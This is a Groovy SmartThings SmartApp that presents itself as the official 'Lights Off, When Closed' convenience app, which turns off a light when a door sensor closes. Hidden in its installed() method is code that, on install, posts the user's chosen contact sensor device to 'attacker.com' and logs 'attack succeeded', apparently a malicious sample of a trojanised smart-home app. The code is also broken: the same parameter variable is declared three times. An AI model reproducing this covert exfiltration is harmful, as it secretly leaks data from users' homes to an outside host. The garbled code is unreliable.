
definition(
    name:"Lights Off,When Closed",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn your lights off when an open/close sensor closes.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_contact-outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_contact-outlet@2 x.png"
)

preferences{
    section("When the door closes..."){
        input"contact1","capability.contactSensor",title:"Where?"
        }
    section("Turn off a light..."){
        input"switch1","capability.switch"
        }
}

def installed()
{
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${contact1}"
    ]
    ]
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    subscribe(contact1,"contact.closed",contactClosedHandler)
}

def updated()
{
    unsubscribe()
    subscribe(contact1,"contact.closed",contactClosedHandler)
}

def contactClosedHandler(evt){
    switch1.off()
}

